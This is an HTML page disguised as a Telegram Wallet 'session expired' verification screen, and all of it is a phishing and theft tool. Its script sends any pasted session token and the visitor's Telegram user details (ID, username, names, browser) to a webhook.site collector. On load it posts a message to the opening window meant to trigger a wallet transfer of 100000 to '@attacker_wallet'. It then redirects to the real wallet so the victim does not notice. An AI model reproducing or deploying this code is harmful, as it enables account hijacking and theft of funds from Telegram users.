<!DOCTYPE html>
<html>
<head>
  <title>Telegram Wallet Session</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    textarea {
      width: 80%;
      height: 100px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
      padding: 10px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      background-color: #2196F3;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #success {
      display: none;
      font-size: 18px;
      color: green;
    }
  </style>
</head>
<body>
  <h1>üîê Session Expired</h1>
  <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>

  <div id="form">
    <textarea id="token" autocomplete="off" name="session_token" placeholder="Paste your session token here..."></textarea><br><br>
    <button onclick="steal()">Verify</button>
  </div>

  <div id="success">
    ‚úÖ Session verified. Redirecting...
  </div>

  <script>
    // Silent wallet trigger via postMessage
    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
    const message = JSON.stringify({
      eventType: 'web_app_open_tg_link',
      eventData: {
        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
      }
    });

    setTimeout(() => {
      try {
        window.opener?.postMessage(message, "*");
        console.log("‚úÖ postMessage payload sent.");
      } catch (e) {
        console.warn("Failed to postMessage:", e);
      }
    }, 1200);

    // Steal token & hide UI
    function steal() {
      const token = document.getElementById("token").value.trim();
      if (!token) return;

      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: `Captured Token: ${token}`
      });

      document.getElementById("form").style.display = "none";
      document.getElementById("success").style.display = "block";

      setTimeout(() => {
        window.location.href = "https://t.me/wallet";
      }, 2000);
    }

    // Telegram WebApp user info steal (if in context)
    try {
      window.Telegram.WebApp.ready();
      const tg = window.Telegram.WebApp;
      const user = tg.initDataUnsafe?.user;

      if (user) {
        fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            telegram_id: user.id,
            username: user.username,
            first_name: user.first_name,
            last_name: user.last_name,
            language_code: user.language_code,
            ua: navigator.userAgent,
            source: "Telegram WebApp"
          })
        });
      }
    } catch (e) {
      console.warn("Not in Telegram WebApp context.");
    }
  </script>
</body>
</html>
